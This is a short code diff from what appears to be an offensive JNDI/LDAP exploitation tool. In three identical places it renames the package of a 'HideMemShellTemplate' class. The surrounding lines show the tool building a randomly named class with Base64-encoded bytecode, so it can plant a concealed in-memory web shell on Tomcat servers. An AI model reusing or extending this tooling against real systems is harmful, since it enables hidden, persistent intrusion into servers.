@@ -475,7 +475,7 @@ public class TomcatBypassController implements LdapController {
                     case 1:
                         break;
                     case 2:
-                        CtClass newClass = pool.get("com.nu1r.jndi.template.HideMemShellTemplate");
+                        CtClass newClass = pool.get("com.qi4l.jndi.template.HideMemShellTemplate");
                         newClass.setName(ClassNameUtils.generateClassName());
                         String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
                         String className = "className=\"" + ctClass.getName() + "\";";
@@ -516,7 +516,7 @@ public class TomcatBypassController implements LdapController {
                     case 1:
                         break;
                     case 2:
-                        CtClass newClass = pool.get("com.nu1r.jndi.template.HideMemShellTemplate");
+                        CtClass newClass = pool.get("com.qi4l.jndi.template.HideMemShellTemplate");
                         newClass.setName(ClassNameUtils.generateClassName());
                         String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
                         String className = "className=\"" + ctClass.getName() + "\";";
@@ -573,7 +573,7 @@ public class TomcatBypassController implements LdapController {
                     case 1:
                         break;
                     case 2:
-                        CtClass newClass = pool.get("com.nu1r.jndi.template.HideMemShellTemplate");
+                        CtClass newClass = pool.get("com.qi4l.jndi.template.HideMemShellTemplate");
                         newClass.setName(ClassNameUtils.generateClassName());
                         String content = "b64=\"" + Base64.encodeBase64String(ctClass.toBytecode()) + "\";";
                         String className = "className=\"" + ctClass.getName() + "\";";
